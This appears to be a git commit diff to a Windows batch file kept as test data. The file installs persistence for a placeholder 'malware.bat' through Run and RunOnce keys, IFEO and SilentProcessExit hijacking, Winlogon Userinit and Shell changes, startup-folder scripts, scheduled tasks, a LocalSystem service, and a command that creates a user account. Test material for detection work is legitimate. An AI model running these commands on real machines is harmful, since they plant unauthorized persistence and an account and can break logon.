3df304727ce7b98fdd4dfe0ddcd4a00d1622e2c3
terrence998 <77708823+terrence998@users.noreply.github.com>
2021-10-29 02:49:46 -0400

    Updated some stuff

--- test_data/setup.bat
+++ test_data/setup.bat
@@ -28,26 +28,35 @@ setlocal
 :: Copy setup.bat into temp folder
 copy /Y %~dp0setup.bat "C:\Windows\Temp\setup.bat"
 
-:: Create registry keys for autorun
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d c:\temp\malware.exe /f
-
-:: Create registry keys for winlogin
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d c:\temp\malware.exe /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\temp\malware.exe" /f
-
 :: Create files for Startup
-echo "C:\Windows\System32\calc.exe" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.bat"
-echo "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\powershell.bat"
+echo @echo off > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
+echo echo hacked by the way >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
+echo pause >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
+echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
+echo echo hacked by the way >> "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
+echo pause >> "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
 
 :: Create scheduled tasks
 SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
 SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F
+
+copy /Y "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat" "C:\Windows\Temp\malware.bat"
+
+:: Create service
+sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem" /f
+
+:: Create registry keys for autorun
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+
+:: Create registry keys for winlogin
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d C:\Windows\Temp\malware.bat /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Windows\Temp\malware.bat" /f
 
 PAUSE
